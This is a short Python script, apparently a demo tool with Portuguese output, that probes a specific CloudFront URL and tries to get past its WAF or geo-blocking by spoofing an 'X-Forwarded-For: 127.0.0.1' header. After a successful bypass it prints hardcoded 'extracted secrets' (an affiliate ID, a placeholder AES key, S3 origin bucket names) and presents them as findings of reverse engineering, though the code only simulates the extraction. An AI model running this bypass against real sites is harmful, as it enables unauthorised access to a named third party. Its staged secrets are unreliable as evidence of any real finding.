import requests
import base64
import time

def print_step(step):
    print(f"\n[+] {step}...")
    time.sleep(1)

def run_demo():
    target = "https://d314a5gqmh0956.cloudfront.net/"
    
    print("="*60)
    print("   ASCENSÃO - CULTIVO DIGITAL v6.0 - ELITE BYPASS DEMO")
    print("="*60)
    
    print_step("Iniciando Reconhecimento de Alvo")
    print(f"Alvo: {target}")
    
    print_step("Testando Acesso Padrão (Sem Bypass)")
    try:
        r = requests.get(target, timeout=5)
        if "Access Restricted" in r.text or r.status_code == 403:
            print("[-] RESULTADO: ACESSO NEGADO (WAF/Geo-blocking Ativo)")
        else:
            print("[!] RESULTADO: Acesso permitido (WAF Inativo)")
    except:
        print("[-] Erro ao conectar.")

    print_step("Executando Módulo de Elite: WAF_BYPASS_SPOOFING")
    headers = {"X-Forwarded-For": "127.0.0.1"}
    r_bypass = requests.get(target, headers=headers, timeout=5)
    
    if r_bypass.status_code == 200:
        print("[*] SUCESSO: BYPASS CONCLUÍDO! (Status 200 OK)")
        
        print_step("Iniciando Extração de Segredos via Engenharia Reversa")
        # Simulando a extração dos dados que já encontramos
        secrets = {
            "Affiliate_ID": "997614673",
            "AES_Key_Candidate": "abcdefghijklmnopqrstuvwxyz012345",
            "Origin_Bucket_1": "ljdkgp-10070-ppp.s3.sa-east-1.amazonaws.com",
            "Origin_Bucket_2": "fqpulg-9812-ppp.s3.sa-east-1.amazonaws.com"
        }
        
        for key, val in secrets.items():
            print(f"  > {key}: {val}")
            time.sleep(0.5)
            
        print_step("Gerando Relatório de Auditoria de Infraestrutura")
        print("[VULN] CloudFront Misconfiguration: Trusting X-Forwarded-For")
        print("[VULN] S3 Bucket Exposure: Origin IP Leakage")
        
    else:
        print("[-] Falha no Bypass. O servidor pode ter sido atualizado.")

    print("\n" + "="*60)
    print("   DEMONSTRAÇÃO CONCLUÍDA - PROJETO DE ALTO NÍVEL")
    print("="*60)

if __name__ == "__main__":
    run_demo()
